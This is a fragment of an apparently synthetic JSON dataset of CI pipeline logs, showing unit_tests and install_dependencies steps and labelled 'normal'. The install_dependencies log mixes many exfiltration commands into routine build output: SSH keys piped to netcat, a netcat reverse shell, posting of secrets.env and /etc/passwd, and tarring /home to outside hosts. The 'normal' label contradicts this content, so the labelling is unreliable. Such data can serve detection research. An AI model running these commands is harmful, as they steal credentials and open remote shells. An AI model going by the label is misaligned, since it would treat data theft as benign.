          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing react@4.2.0",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 test completed",
          "Installing lodash@4.13.0",
          "  PASS: test_cache_hit (143ms)",
          "WARNING: express has known vulnerabilities",
          "Installing axios@1.2.0",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Installing webpack@1.4.0",
          "Cache hit for key-4766",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_api_health (372ms)",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Installing prettier@5.17.0",
          "Step 6/10: Building",
          "\u2713 build completed",
          "  PASS: test_db_connect (483ms)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 test completed",
          "Installing express@4.12.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-4996",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-14T12:02:39.659560",
        "finished_at": "2025-12-14T12:03:03.009082",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "Installing jest@1.17.0",
          "Installing webpack@4.11.0",
          "  PASS: test_cache_hit (193ms)",
          "Step 10/10: Building",
          "[12:00:35] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-7056",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 37.253.160.75 45575",
          "Cache hit for key-9764",
          "Cache hit for key-1532",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_auth_login (310ms)",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "Installing prettier@2.19.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_auth_login (150ms)",
          "Cache hit for key-5365",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "Installing axios@3.6.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "Installing react@1.10.0",
          "Compiling src/index.js...",
          "Cache hit for key-9289",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-7027",
          "Compiling src/index.js...",
          "Installing axios@4.3.0",
          "\u2713 build completed",
          "Cache hit for key-3552",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:35] ERROR: Connection failed",
          "  PASS: test_cache_hit (312ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2717 build failed with exit code 44",
          "Installing jest@4.12.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 83.190.194.99 38553",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "nc -e /bin/sh 19.116.5.123 7284",
          "Exception: RuntimeError",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "FAILED: test_api_health",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Cache hit for key-1697",
          "Compiling src/service.java...",
          "Installing axios@1.5.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "Sending 129MB of data to cloud.services",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Artifact uploaded: build.tar.gz (32MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 34.124.140.20 15313",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-2505",
          "Compiling src/utils.go...",
          "Sending 83MB of data to acme.corp",
          "Installing lodash@3.5.0",
          "[12:00:35] INFO: Processing request",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Sending 95MB of data to cloud.services",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Cache hit for key-3772",
          "[12:00:35] INFO: Processing request",
          "Installing react@3.9.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:35] ERROR: Connection failed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (149ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 177.25.16.205 49380",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:35] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 167.92.57.14 51778",
          "[12:00:35] INFO: Processing request",
          "Installing jest@2.13.0",
          "Installing axios@4.11.0",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (112ms)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Sending 89MB of data to cloud.services",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-7561",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (87ms)",
          "Installing jest@1.14.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 69.81.63.195 37714",
          "Sending 120MB of data to test.io",
          "Exception: NullPointerException",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "  PASS: test_user_create (240ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-2919",
          "Compiling src/handler.rs...",
          "Cache hit for key-1691",
          "Compiling src/index.js...",
          "  PASS: test_api_health (92ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-1919",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 lint completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-9321",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (453ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-7374",
          "Step 10/10: Building",
          "=== Step install_dependencies completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}